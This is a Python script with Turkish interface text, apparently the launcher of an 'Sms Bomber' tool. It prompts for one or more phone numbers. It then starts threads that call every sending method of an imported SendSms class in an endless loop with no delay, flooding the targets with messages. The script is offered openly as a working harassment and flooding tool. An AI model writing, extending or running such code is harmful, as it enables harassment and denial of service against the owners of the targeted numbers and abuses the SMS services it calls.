from colorama import Fore, Style
import threading
import time
from sms import SendSms
from os import system
import os

banner = f"""
{Fore.RED}_______{Fore.GREEN} _______{Fore.BLUE} ______{Fore.YELLOW}    _______{Fore.MAGENTA} ________ {Style.RESET_ALL}
{Fore.RED}|  ____|{Fore.GREEN}|  ____|{Fore.BLUE}|  __ \ {Fore.YELLOW}  |_   _|{Fore.MAGENTA} |__   __|{Style.RESET_ALL}
{Fore.RED}| |__   {Fore.GREEN}| |__   {Fore.BLUE}| |__) |   {Fore.YELLOW} | |   {Fore.MAGENTA}   | |   {Style.RESET_ALL}
{Fore.RED}|  __|  {Fore.GREEN}|  __|  {Fore.BLUE}|  _  /  {Fore.YELLOW}   | |  {Fore.MAGENTA}    | |   {Style.RESET_ALL}
{Fore.RED}| |     {Fore.GREEN}| |____ {Fore.BLUE}| | \ \   {Fore.YELLOW} _| |_  {Fore.MAGENTA}   | |   {Style.RESET_ALL}
{Fore.RED}|_|     {Fore.GREEN}|______|{Fore.BLUE}|_|  \_\  {Fore.YELLOW}\_____|{Fore.MAGENTA}    |_|   {Style.RESET_ALL}
{Fore.RED}{" " * 40}by @ferit22901{Style.RESET_ALL}
{Fore.LIGHTMAGENTA_EX}Sms Bomber :){Style.RESET_ALL}

"""

def send_sms_to_number(telefon, mail, kere, aralik):
    sms = SendSms(telefon, mail)
    while kere == float('inf') or kere > 0:
        for attribute in dir(sms):
            attribute_value = getattr(sms, attribute)
            if callable(attribute_value) and not attribute.startswith('__'):
                if attribute == 'send_discord_notification':
                    # `send_discord_notification` işlevini doğru parametrelerle çağırın.
                    sms.send_discord_notification("Test Service", telefon, "Başarılı", "Başarılı bir şekilde SMS gönderildi.")
                else:
                    attribute_value()
                time.sleep(aralik)
        if kere != float('inf'):
            kere -= 1

def main():
    system("cls||clear")
    
    print(banner)
    print(Style.RESET_ALL)
    system("cls||clear")
    try:
        while True:
            print(banner)
            print(Style.RESET_ALL)
            print(f"{Fore.YELLOW}Lütfen aşağıdaki seçeneklerden birini seçin:{Style.RESET_ALL}")
            print(f"{Fore.GREEN}1. Tek bir numaraya SMS gönder{Style.RESET_ALL}")
            print(f"{Fore.GREEN}2. Birden fazla numaraya SMS gönder{Style.RESET_ALL}")
            secenek = input(f"{Fore.MAGENTA}Seçeneği girin (1/2): {Style.RESET_ALL}")

            if secenek == '1':
                system("cls||clear")
                telefon = input(f"{Fore.LIGHTGREEN_EX}SMS göndermek istediğiniz numarayı girin: {Style.RESET_ALL}")
                mail = ""
                system("cls||clear")
                kere = float('inf')  # Sonsuz gönderim
                aralik = 0
                system("cls||clear")
                send_sms_to_number(telefon, mail, kere, aralik)
                break
            elif secenek == '2':
                system("cls||clear")
                tel_liste = {}
                while True:
                    isim = input(f"{Fore.LIGHTGREEN_EX}Numaranın ismini girin (çıkmak için 'q' girin): {Style.RESET_ALL}")
                    system("cls||clear")
                    if isim == 'q':
                        break
                    telefon = input(f"{Fore.LIGHTGREEN_EX}{isim} adlı numaranın telefon numarasını girin: {Style.RESET_ALL}")
                    system("cls||clear")
                    tel_liste[isim] = telefon
                if len(tel_liste) == 0:
                    print(f"{Fore.RED}En az bir numara eklemelisiniz. {Style.RESET_ALL}")
                    continue
                mail = ""
                system("cls||clear")
                kere = float('inf')  # Sonsuz gönderim
                aralik = 0
                system("cls||clear")

                threads = []
                for isim, telefon in tel_liste.items():
                    thread = threading.Thread(target=send_sms_to_number, args=(telefon, mail, kere, aralik))
                    threads.append(thread)
                    thread.start()

                for thread in threads:
                    thread.join()
                break
            else:
                print(f"{Fore.RED}Geçersiz seçenek, lütfen tekrar deneyin. {Style.RESET_ALL}")
                time.sleep(1)
                os.system('cls' if os.name == 'nt' else 'clear')

        print(f"{Fore.LIGHTGREEN_EX}\nGönderim tamamlandı. Program sona eriyor. {Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"{Fore.RED}\nKullanıcı tarafından işlem iptal edildi.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
